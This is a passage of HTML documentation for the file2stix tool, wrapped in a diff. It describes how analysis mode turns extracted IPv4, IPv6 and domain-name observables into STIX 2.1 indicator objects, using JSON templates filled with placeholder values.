+    <nav class="md-nav" aria-label="2.2 IPv6 Observables with port (indicator)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#stix-21-indicator-sdo_3" class="md-nav__link">
+    STIX 2.1 indicator SDO
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#stix-21-ipv6-addr-and-network-traffic-sco" class="md-nav__link">
+    STIX 2.1 ipv6-addr and network-traffic SCO
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#3-domain-name-observables-indicator" class="md-nav__link">
+    3. Domain Name Observables (indicator)
+  </a>
+  
+    <nav class="md-nav" aria-label="3. Domain Name Observables (indicator)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#stix-21-indicator-sdo_4" class="md-nav__link">
+    STIX 2.1 indicator SDO
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#stix-21-domain-name-sco" class="md-nav__link">
+    STIX 2.1 domain-name SCO
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#4-url-observables-indicator" class="md-nav__link">
+    4. URL Observables (indicator)
+  </a>
+  
+    <nav class="md-nav" aria-label="4. URL Observables (indicator)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#stix-21-indicator-sdo_5" class="md-nav__link">
+    STIX 2.1 indicator SDO
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#stix-21-url-sco" class="md-nav__link">
+    STIX 2.1 url SCO
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#5-file-name-observables-indicator" class="md-nav__link">
+    5. File Name Observables (indicator)
+  </a>
+  
+    <nav class="md-nav" aria-label="5. File Name Observables (indicator)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#stix-21-indicator-sdo_6" class="md-nav__link">
+    STIX 2.1 indicator SDO
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#stix-21-file-sco" class="md-nav__link">
+    STIX 2.1 file SCO
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#6-directory-path-observables-indicator" class="md-nav__link">
+    6. Directory Path Observables (indicator)
+  </a>
+  
+    <nav class="md-nav" aria-label="6. Directory Path Observables (indicator)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#stix-21-indicator-sdo_7" class="md-nav__link">
+    STIX 2.1 indicator SDO
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#stix-21-directory-sco" class="md-nav__link">
+    STIX 2.1 directory SCO
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#7-file-hashes-indicator" class="md-nav__link">
+    7. File Hashes (indicator)
+  </a>
+  
+    <nav class="md-nav" aria-label="7. File Hashes (indicator)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#stix-21-indicator-sdo_8" class="md-nav__link">
+    STIX 2.1 indicator SDO
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#stix-21-file-sco_1" class="md-nav__link">
+    STIX 2.1 file SCO
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#8-email-address-observables-indicator" class="md-nav__link">
+    8. Email Address Observables (indicator)
+  </a>
+  
+    <nav class="md-nav" aria-label="8. Email Address Observables (indicator)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#stix-21-indicator-sdo_9" class="md-nav__link">
+    STIX 2.1 indicator SDO
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#stix-21-file-sco_2" class="md-nav__link">
+    STIX 2.1 file SCO
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#9-mac-address-observables-indicator" class="md-nav__link">
+    9. MAC Address Observables (indicator)
+  </a>
+  
+    <nav class="md-nav" aria-label="9. MAC Address Observables (indicator)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#stix-21-indicator-sdo_10" class="md-nav__link">
+    STIX 2.1 indicator SDO
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#stix-21-mac-addr-sco" class="md-nav__link">
+    STIX 2.1 mac-addr SCO
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#10-windows-registry-key-observables-indicator" class="md-nav__link">
+    10. Windows Registry Key Observables (indicator)
+  </a>
+  
+    <nav class="md-nav" aria-label="10. Windows Registry Key Observables (indicator)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#stix-21-indicator-sdo_11" class="md-nav__link">
+    STIX 2.1 indicator SDO
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#stix-21-windows-registry-key-sco" class="md-nav__link">
+    STIX 2.1 windows-registry-key SCO
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#11-user-agent-observables-indicator" class="md-nav__link">
+    11. User Agent Observables (indicator)
+  </a>
+  
+    <nav class="md-nav" aria-label="11. User Agent Observables (indicator)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#stix-21-extension-definition" class="md-nav__link">
+    STIX 2.1 extension-definition
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#stix-21-user-agent-sco" class="md-nav__link">
+    STIX 2.1 user-agent SCO
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#stix-21-indicator-sdo_12" class="md-nav__link">
+    STIX 2.1 indicator SDO
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#12-autonomous-system-number-observables-indicator" class="md-nav__link">
+    12. Autonomous System Number Observables (indicator)
+  </a>
+  
+    <nav class="md-nav" aria-label="12. Autonomous System Number Observables (indicator)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#stix-21-indicator-sdo_13" class="md-nav__link">
+    STIX 2.1 indicator SDO
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#stix-21-autonomous-system-sco" class="md-nav__link">
+    STIX 2.1 autonomous-system SCO
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#13-cryptocurrency-observables-indicator" class="md-nav__link">
+    13. Cryptocurrency Observables (indicator)
+  </a>
+  
+    <nav class="md-nav" aria-label="13. Cryptocurrency Observables (indicator)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#stix-21-extension-definition_1" class="md-nav__link">
+    STIX 2.1 extension-definition
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#stix-21-cryptocurrency-transaaction-sco" class="md-nav__link">
+    STIX 2.1 cryptocurrency transaaction SCO
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#stix-21-indicator-sdo_14" class="md-nav__link">
+    STIX 2.1 indicator SDO
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#14-cve-observables-vulnerability" class="md-nav__link">
+    14. CVE Observables (vulnerability)
+  </a>
+  
+    <nav class="md-nav" aria-label="14. CVE Observables (vulnerability)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#stix-21-vulnerability-extension-definition" class="md-nav__link">
+    STIX 2.1 vulnerability extension-definition
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#stix-21-vulnerability-sdo" class="md-nav__link">
+    STIX 2.1 vulnerability SDO
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#stix-21-indictor-extension-definition" class="md-nav__link">
+    STIX 2.1 indictor extension-definition
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#stix-21-indicator-sdo_15" class="md-nav__link">
+    STIX 2.1 indicator SDO
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#15-country-observables-location" class="md-nav__link">
+    15. Country Observables (location)
+  </a>
+  
+    <nav class="md-nav" aria-label="15. Country Observables (location)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#stix-21-location-sdo" class="md-nav__link">
+    STIX 2.1 location SDO
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#16-credit-card-observables-indicator" class="md-nav__link">
+    16. Credit Card Observables (indicator)
+  </a>
+  
+    <nav class="md-nav" aria-label="16. Credit Card Observables (indicator)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#stix-21-extension-definition_2" class="md-nav__link">
+    STIX 2.1 extension-definition
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#stix-21-credit-card-sco" class="md-nav__link">
+    STIX 2.1 credit-card SCO
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#stix-21-indicator-sdo_16" class="md-nav__link">
+    STIX 2.1 indicator SDO
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#17-bank-account-observables-indicator" class="md-nav__link">
+    17. Bank Account Observables (indicator)
+  </a>
+  
+    <nav class="md-nav" aria-label="17. Bank Account Observables (indicator)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#stix-21-extension-definition_3" class="md-nav__link">
+    STIX 2.1 extension-definition
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#stix-21-bank-account-sco" class="md-nav__link">
+    STIX 2.1 bank-account SCO
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#stix-21-indicator-sdo_17" class="md-nav__link">
+    STIX 2.1 indicator SDO
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#18-yara-rule-observables-indicator" class="md-nav__link">
+    18. YARA Rule Observables (indicator)
+  </a>
+  
+    <nav class="md-nav" aria-label="18. YARA Rule Observables (indicator)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#stix-21-indicator-sdo_18" class="md-nav__link">
+    STIX 2.1 indicator SDO
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#19-sigma-rule-observables-indicator" class="md-nav__link">
+    19. SIGMA Rule Observables (indicator)
+  </a>
+  
+    <nav class="md-nav" aria-label="19. SIGMA Rule Observables (indicator)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#stix-21-extension-definition_4" class="md-nav__link">
+    STIX 2.1 extension-definition
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#stix-21-indicator-sdo_19" class="md-nav__link">
+    STIX 2.1 indicator SDO
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#20-cpe-observables-software" class="md-nav__link">
+    20. CPE Observables (software)
+  </a>
+  
+    <nav class="md-nav" aria-label="20. CPE Observables (software)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#stix-21-indicator-sdo_20" class="md-nav__link">
+    STIX 2.1 Indicator SDO
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#stix-21-software-sco" class="md-nav__link">
+    STIX 2.1 software SCO
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#21-mitre-attck-observables" class="md-nav__link">
+    21. MITRE ATT&amp;CK Observables
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#22-mitre-capec-observables" class="md-nav__link">
+    22. MITRE CAPEC Observables
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#23-lookups" class="md-nav__link">
+    23. Lookups
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#24-custom-extractions" class="md-nav__link">
+    24. Custom Extractions
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+  <a href="https://github.com/signalscorps/file2stix/edit/main/docs/extractions-analysis-mode.md" title="Edit this page" class="md-content__button md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20.71 7.04c.39-.39.39-1.04 0-1.41l-2.34-2.34c-.37-.39-1.02-.39-1.41 0l-1.84 1.83 3.75 3.75M3 17.25V21h3.75L17.81 9.93l-3.75-3.75L3 17.25Z"/></svg>
+  </a>
+
+
+<h1 id="extractions-analysis-mode">Extractions: Analysis Mode<a class="headerlink" href="#extractions-analysis-mode" title="Permanent link">&para;</a></h1>
+<p>Analysis mode creates generic STIX 2.1 representing threat intel.</p>
+<p>It is recommended this mode is used when inputting generic threat intel into file2stix (rather than organisational specific observed intelligence).</p>
+<h2 id="sco-creation-logic">SCO creation logic<a class="headerlink" href="#sco-creation-logic" title="Permanent link">&para;</a></h2>
+<p>Note, SCOs are created from Patterns in SDOs. e.g. <code>[ipv4-addr:value='1.1.1.1']</code> become an SCO of <code>"type": "ipv4-addr</code> with a <code>"value": "1.1.1.1"</code></p>
+<p>This is done by pattern2sco: https://github.com/signalscorps/pattern2sco</p>
+<h2 id="11-ipv4-address-observables-without-port-indicator">1.1 IPv4 Address Observables without port (<code>indicator</code>)<a class="headerlink" href="#11-ipv4-address-observables-without-port-indicator" title="Permanent link">&para;</a></h2>
+<ul>
+<li>e.g. <code>198.51.100.3</code></li>
+<li>e.g. <code>198.51.100.0/24</code> (with CIDR)</li>
+</ul>
+<p>Lots of IPv4 extraction logic exists on the internet (<a href="https://github.com/kvesteri/validators/blob/master/validators/ip_address.py">for example</a>).</p>
+<p>IPv4 Address Observables are represented by <a href="https://docs.oasis-open.org/cti/stix/v2.1/csprd01/stix-v2.1-csprd01.html#_Toc16070633">STIX Indicator SDOs (<code>"type": "indicator"</code>)</a>, using the <a href="https://docs.oasis-open.org/cti/stix/v2.1/csprd01/stix-v2.1-csprd01.html#_Toc16070714">STIX IPv4 Address SCO (<code>"type": "ipv4-addr"</code>)</a> to create the Indicator SDO <code>pattern</code> property.</p>
+<p>Here is how ipv4 observables are represented in STIX 2.1 by file2stix;</p>
+<h3 id="stix-21-indicator-sdo">STIX 2.1 indicator SDO<a class="headerlink" href="#stix-21-indicator-sdo" title="Permanent link">&para;</a></h3>
+<pre><code class="language-json">{
+    &quot;type&quot;: &quot;indicator&quot;,
+    &quot;spec_version&quot;: &quot;2.1&quot;,
+    &quot;id&quot;: &quot;indicator--&lt;GENERATED BY STIX2 LIBRARY&gt;&quot;,
+    &quot;created_by_ref&quot;: &quot;identity--&lt;IF TLP RED/AMBER/GREEN USER IDENTITY ID&gt;&quot;,
+    &quot;created&quot;: &quot;&lt;REPORT CREATED PROPERTY VALUE&gt;&quot;,
+    &quot;modified&quot;: &quot;&lt;REPORT MODIFIED PROPERTY VALUE&gt;&quot;,
+    &quot;indicator_types&quot;: [
+        &quot;unknown&quot;,
+        &quot;&lt;IF MATCHES WARNING LIST BENIGN&gt;&quot;
+    ],
+    &quot;confidence&quot;: &quot;&lt;CONFIDENCE SCORE IF SET AND TLP RED/AMBER/GREEN&gt;&quot;,
+    &quot;name&quot;: &quot;ipv4: &lt;EXTRACTED IPV4 OBSERVABLE VALUE&gt;&quot;,
+    &quot;pattern_type&quot;: &quot;stix&quot;,
+    &quot;pattern&quot;: &quot;[ ipv4-addr:value = '&lt;EXTRACTED IPV4 OBSERVABLE VALUE&gt;' ]&quot;,
+    &quot;valid_from&quot;: &quot;&lt;REPORT CREATED PROPERTY VALUE&gt;&quot;,
+    &quot;object_marking_refs&quot;: [
+        &quot;marking-definition--&lt;TLP LEVEL SET&gt;&quot;
+    ]
+}
+</code></pre>
+<h3 id="stix-21-ipv4-addr-sco">STIX 2.1 ipv4-addr SCO<a class="headerlink" href="#stix-21-ipv4-addr-sco" title="Permanent link">&para;</a></h3>
+<pre><code class="language-json">{
+    &quot;type&quot;: &quot;ipv4-addr&quot;,
+    &quot;spec_version&quot;: &quot;2.1&quot;,
+    &quot;id&quot;: &quot;ipv4-addr--&lt;GENERATED BY STIX2 LIBRARY&gt;&quot;,
+    &quot;value&quot;: &quot;&lt;EXTRACTED IPV4 OBSERVABLE VALUE&gt;&quot;,
+    &quot;defanged&quot;: &quot;&lt;DEFANGED BOOLEAN&gt;&quot;
+}
+</code></pre>
+<h2 id="12-ipv4-address-observables-with-port-indicator">1.2 IPv4 Address Observables with port (<code>indicator</code>)<a class="headerlink" href="#12-ipv4-address-observables-with-port-indicator" title="Permanent link">&para;</a></h2>
+<ul>
+<li>e.g. <code>198.51.100.0:80</code> (with port)</li>
+</ul>
+<p>Note for ipv4 and port observables, the representation is slightly different. When an IPv4 and port is detected (e.g. <code>1.1.1.1:80</code>) and Indicator SDO with the following structure is created:</p>
+<h3 id="stix-21-indicator-sdo_1">STIX 2.1 indicator SDO<a class="headerlink" href="#stix-21-indicator-sdo_1" title="Permanent link">&para;</a></h3>
+<pre><code class="language-json">{
+    &quot;type&quot;: &quot;indicator&quot;,
+    &quot;spec_version&quot;: &quot;2.1&quot;,
+    &quot;id&quot;: &quot;indicator--&lt;GENERATED BY STIX2 LIBRARY&gt;&quot;,
+    &quot;created_by_ref&quot;: &quot;identity--&lt;IF TLP RED/AMBER/GREEN USER IDENTITY ID&gt;&quot;,
+    &quot;created&quot;: &quot;&lt;REPORT CREATED PROPERTY VALUE&gt;&quot;,
+    &quot;modified&quot;: &quot;&lt;REPORT MODIFIED PROPERTY VALUE&gt;&quot;,
+    &quot;indicator_types&quot;: [
+        &quot;unknown&quot;,
+        &quot;&lt;IF MATCHES WARNING LIST BENIGN&gt;&quot;
+    ],
+    &quot;confidence&quot;: &quot;&lt;CONFIDENCE SCORE IF SET AND TLP RED/AMBER/GREEN&gt;&quot;,
+    &quot;name&quot;: &quot;ipv4: &lt;EXTRACTED IPV4 OBSERVABLE VALUE&gt;&quot;,
+    &quot;pattern_type&quot;: &quot;stix&quot;,
+    &quot;pattern&quot;: &quot;[ ipv4-addr:value = '&lt;EXTRACTED IPV4 OBSERVABLE VALUE&gt;' AND network-traffic:dst_port = '&lt;EXTRACTED IPV4 PORT VALUE&gt;' ]&quot;,
+    &quot;valid_from&quot;: &quot;&lt;REPORT CREATED PROPERTY VALUE&gt;&quot;,
+    &quot;object_marking_refs&quot;: [
+        &quot;marking-definition--&lt;TLP LEVEL SET&gt;&quot;
+    ]
+}
+</code></pre>
+<h3 id="stix-21-ipv4-addr-and-network-traffic-sco">STIX 2.1 ipv4-addr and network-traffic SCO<a class="headerlink" href="#stix-21-ipv4-addr-and-network-traffic-sco" title="Permanent link">&para;</a></h3>
+<pre><code class="language-json">{
+    &quot;type&quot;: &quot;ipv4-addr&quot;,
+    &quot;spec_version&quot;: &quot;2.1&quot;,
+    &quot;id&quot;: &quot;ipv4-addr--&lt;GENERATED BY STIX2 LIBRARY&gt;&quot;,
+    &quot;value&quot;: &quot;&lt;EXTRACTED IPV4 OBSERVABLE VALUE&gt;&quot;,
+    &quot;defanged&quot;: &quot;&lt;DEFANGED BOOLEAN&gt;&quot;
+}
+</code></pre>
+<pre><code class="language-json">{
+    &quot;type&quot;: &quot;network-traffic&quot;,
+    &quot;spec_version&quot;: &quot;2.1&quot;,
+    &quot;id&quot;: &quot;network-traffic--&lt;GENERATED BY STIX2 LIBRARY&gt;&quot;,
+    &quot;dst_ref&quot;: &quot;ipv4-addr--&lt;IPV4 OBJECT ID&gt;&quot;,
+    &quot;dst_port&quot;: &quot;&lt;EXTRACTED IPV4 PORT VALUE&gt;&quot;,
+    &quot;protocols&quot;: [
+        &quot;ipv4&quot;
+    ]
+}
+</code></pre>
+<h2 id="21-ipv6-observables-without-port-indicator">2.1 IPv6 Observables without port (<code>indicator</code>)<a class="headerlink" href="#21-ipv6-observables-without-port-indicator" title="Permanent link">&para;</a></h2>
+<ul>
+<li>e.g. <code>2001:0db8:85a3:0000:0000:8a2e:0370:7334</code></li>
+<li>e.g. <code>2002::abcd:ffff:c0a8:101/64</code></li>
+</ul>
+<p>Lots of IPv4 extraction logic exists on the internet (<a href="https://github.com/kvesteri/validators/blob/master/validators/ip_address.py">for example</a>).</p>
+<p>IPv6 Observables are represented by <a href="https://docs.oasis-open.org/cti/stix/v2.1/csprd01/stix-v2.1-csprd01.html#_Toc16070633">STIX Indicator SDOs (<code>"type": "indicator"</code>)</a>, using the <a href="https://docs.oasis-open.org/cti/stix/v2.1/csprd01/stix-v2.1-csprd01.html#_Toc16070717">STIX IPv6 Address SCO (<code>"type": "ipv6-addr"</code>)</a> to create the Indicator SDO <code>pattern</code> property.</p>
+<p>Here is how ipv6 observables are represented in STIX 2.1 by file2stix;</p>
+<h3 id="stix-21-indicator-sdo_2">STIX 2.1 indicator SDO<a class="headerlink" href="#stix-21-indicator-sdo_2" title="Permanent link">&para;</a></h3>
+<pre><code class="language-json">{
+    &quot;type&quot;: &quot;indicator&quot;,
+    &quot;spec_version&quot;: &quot;2.1&quot;,
+    &quot;id&quot;: &quot;indicator--&lt;GENERATED BY STIX2 LIBRARY&gt;&quot;,
+    &quot;created_by_ref&quot;: &quot;identity--&lt;IF TLP RED/AMBER/GREEN USER IDENTITY ID&gt;&quot;,
+    &quot;created&quot;: &quot;&lt;REPORT CREATED PROPERTY VALUE&gt;&quot;,
+    &quot;modified&quot;: &quot;&lt;REPORT MODIFIED PROPERTY VALUE&gt;&quot;,
+    &quot;indicator_types&quot;: [
+        &quot;unknown&quot;,
+        &quot;&lt;IF MATCHES WARNING LIST BENIGN&gt;&quot;
+    ],
+    &quot;confidence&quot;: &quot;&lt;CONFIDENCE SCORE IF SET AND TLP RED/AMBER/GREEN&gt;&quot;,
+    &quot;name&quot;: &quot;ipv6: &lt;EXTRACTED IPV6 OBSERVABLE VALUE&gt;&quot;,
+    &quot;pattern_type&quot;: &quot;stix&quot;,
+    &quot;pattern&quot;: &quot;[ ipv6-addr:value = '&lt;EXTRACTED IPV6 OBSERVABLE VALUE&gt;' ]&quot;,
+    &quot;valid_from&quot;: &quot;&lt;REPORT CREATED PROPERTY VALUE&gt;&quot;,
+    &quot;object_marking_refs&quot;: [
+        &quot;marking-definition--&lt;TLP LEVEL SET&gt;&quot;
+    ]
+}
+</code></pre>
+<h3 id="stix-21-ipv6-addr-sco">STIX 2.1 ipv6-addr SCO<a class="headerlink" href="#stix-21-ipv6-addr-sco" title="Permanent link">&para;</a></h3>
+<pre><code class="language-json">{
+    &quot;type&quot;: &quot;ipv6-addr&quot;,
+    &quot;spec_version&quot;: &quot;2.1&quot;,
+    &quot;id&quot;: &quot;ipv4-addr--&lt;GENERATED BY STIX2 LIBRARY&gt;&quot;,
+    &quot;value&quot;: &quot;&lt;EXTRACTED IPV6 OBSERVABLE VALUE&gt;&quot;,
+    &quot;defanged&quot;: &quot;&lt;DEFANGED BOOLEAN&gt;&quot;
+}
+</code></pre>
+<h2 id="22-ipv6-observables-with-port-indicator">2.2 IPv6 Observables with port (<code>indicator</code>)<a class="headerlink" href="#22-ipv6-observables-with-port-indicator" title="Permanent link">&para;</a></h2>
+<ul>
+<li>e.g. <code>[2001:0db8:85a3:0000:0000:8a2e:0370:7334]:80</code></li>
+</ul>
+<p>Note for ipv6 and port observables, the representation is slightly different. When an IPv6 and port is detected (e.g. <code>[2001:0db8:85a3:0000:0000:8a2e:0370:7334]:80</code>) and Indicator SDO with the following structure is created:</p>
+<h3 id="stix-21-indicator-sdo_3">STIX 2.1 indicator SDO<a class="headerlink" href="#stix-21-indicator-sdo_3" title="Permanent link">&para;</a></h3>
+<pre><code class="language-json">{
+    &quot;type&quot;: &quot;indicator&quot;,
+    &quot;spec_version&quot;: &quot;2.1&quot;,
+    &quot;id&quot;: &quot;indicator--&lt;GENERATED BY STIX2 LIBRARY&gt;&quot;,
+    &quot;created_by_ref&quot;: &quot;identity--&lt;IF TLP RED/AMBER/GREEN USER IDENTITY ID&gt;&quot;,
+    &quot;created&quot;: &quot;&lt;REPORT CREATED PROPERTY VALUE&gt;&quot;,
+    &quot;modified&quot;: &quot;&lt;REPORT MODIFIED PROPERTY VALUE&gt;&quot;,
+    &quot;indicator_types&quot;: [
+        &quot;unknown&quot;,
+        &quot;&lt;IF MATCHES WARNING LIST BENIGN&gt;&quot;
+    ],
+    &quot;confidence&quot;: &quot;&lt;CONFIDENCE SCORE IF SET AND TLP RED/AMBER/GREEN&gt;&quot;,
+    &quot;name&quot;: &quot;ipv6: &lt;EXTRACTED IPV6 OBSERVABLE VALUE&gt;&quot;,
+    &quot;pattern_type&quot;: &quot;stix&quot;,
+    &quot;pattern&quot;: &quot;[ ipv6-addr:value = '&lt;EXTRACTED IPV6 OBSERVABLE VALUE WITH [] REMOVED&gt;' AND network-traffic:dst_port = '&lt;EXTRACTED IPV6 PORT VALUE&gt;' ]&quot;,
+    &quot;valid_from&quot;: &quot;&lt;REPORT CREATED PROPERTY VALUE&gt;&quot;,
+    &quot;object_marking_refs&quot;: [
+        &quot;marking-definition--&lt;TLP LEVEL SET&gt;&quot;
+    ]
+}
+</code></pre>
+<h3 id="stix-21-ipv6-addr-and-network-traffic-sco">STIX 2.1 ipv6-addr and network-traffic SCO<a class="headerlink" href="#stix-21-ipv6-addr-and-network-traffic-sco" title="Permanent link">&para;</a></h3>
+<pre><code class="language-json">{
+    &quot;type&quot;: &quot;ipv6-addr&quot;,
+    &quot;spec_version&quot;: &quot;2.1&quot;,
+    &quot;id&quot;: &quot;ipv4-addr--&lt;GENERATED BY STIX2 LIBRARY&gt;&quot;,
+    &quot;value&quot;: &quot;&lt;EXTRACTED IPV6 OBSERVABLE VALUE&gt;&quot;,
+    &quot;defanged&quot;: &quot;&lt;DEFANGED BOOLEAN&gt;&quot;
+}
+</code></pre>
+<pre><code class="language-json">{
+    &quot;type&quot;: &quot;network-traffic&quot;,
+    &quot;spec_version&quot;: &quot;2.1&quot;,
+    &quot;id&quot;: &quot;network-traffic--&lt;GENERATED BY STIX2 LIBRARY&gt;&quot;,
+    &quot;dst_ref&quot;: &quot;ipv4-addr--&lt;IPV6 OBJECT ID&gt;&quot;,
+    &quot;dst_port&quot;: &quot;&lt;EXTRACTED IPV6 PORT VALUE&gt;&quot;,
+    &quot;protocols&quot;: [
+        &quot;ipv6&quot;
+    ]
+}
+</code></pre>
+<h2 id="3-domain-name-observables-indicator">3. Domain Name Observables (<code>indicator</code>)<a class="headerlink" href="#3-domain-name-observables-indicator" title="Permanent link">&para;</a></h2>
+<ul>
+<li>e.g. domain <code>example.com</code></li>
+<li>e.g. sub domain <code>test.example.com</code></li>
+</ul>
+<p>Lots of domain extraction logic exists on the internet (<a href="https://github.com/kvesteri/validators/blob/master/validators/domain.py">for example</a>). It is generally a good idea to also use a dictionary to validate the top level domain to ensure it is a domain (and not a file extension). <a href="https://github.com/cmu-sei/cyobstract/blob/master/etc/tlds.txt">Lots of TLD dictionaries exist to do this</a>, although ensuring they are current can be a challenge.</p>
+<p>Domain Name Observables are represented by <a href="https://docs.oasis-open.org/cti/stix/v2.1/csprd01/stix-v2.1-csprd01.html#_Toc16070633">STIX Indicator SDOs (<code>"type": "indicator"</code>)</a>, using the <a href="https://docs.oasis-open.org/cti/stix/v2.1/csprd01/stix-v2.1-csprd01.html#_Toc16070687">STIX Domain Name SCO (<code>"type": "domain-name"</code>)</a> to create the Indicator SDO <code>pattern</code> property.</p>
+<p>Here is how domain name observables are represented in STIX 2.1 by file2stix;</p>
+<h3 id="stix-21-indicator-sdo_4">STIX 2.1 indicator SDO<a class="headerlink" href="#stix-21-indicator-sdo_4" title="Permanent link">&para;</a></h3>
+<pre><code class="language-json">{
+    &quot;type&quot;: &quot;indicator&quot;,
+    &quot;spec_version&quot;: &quot;2.1&quot;,
+    &quot;id&quot;: &quot;indicator--&lt;GENERATED BY STIX2 LIBRARY&gt;&quot;,
+    &quot;created_by_ref&quot;: &quot;identity--&lt;IF TLP RED/AMBER/GREEN USER IDENTITY ID&gt;&quot;,
+    &quot;created&quot;: &quot;&lt;REPORT CREATED PROPERTY VALUE&gt;&quot;,
+    &quot;modified&quot;: &quot;&lt;REPORT MODIFIED PROPERTY VALUE&gt;&quot;,
+    &quot;indicator_types&quot;: [
+        &quot;unknown&quot;,
+        &quot;&lt;IF MATCHES WARNING LIST BENIGN&gt;&quot;
+    ],
+    &quot;confidence&quot;: &quot;&lt;CONFIDENCE SCORE IF SET AND TLP RED/AMBER/GREEN&gt;&quot;,
+    &quot;name&quot;: &quot;Domain: &lt;EXTRACTED DOMAIN NAME OBSERVABLE VALUE&gt;&quot;,
+    &quot;pattern_type&quot;: &quot;stix&quot;,
+    &quot;pattern&quot;: &quot;[ domain-name:value = '&lt;EXTRACTED DOMAIN NAME OBSERVABLE VALUE&gt;' ]&quot;,
+    &quot;valid_from&quot;: &quot;&lt;REPORT CREATED PROPERTY VALUE&gt;&quot;,
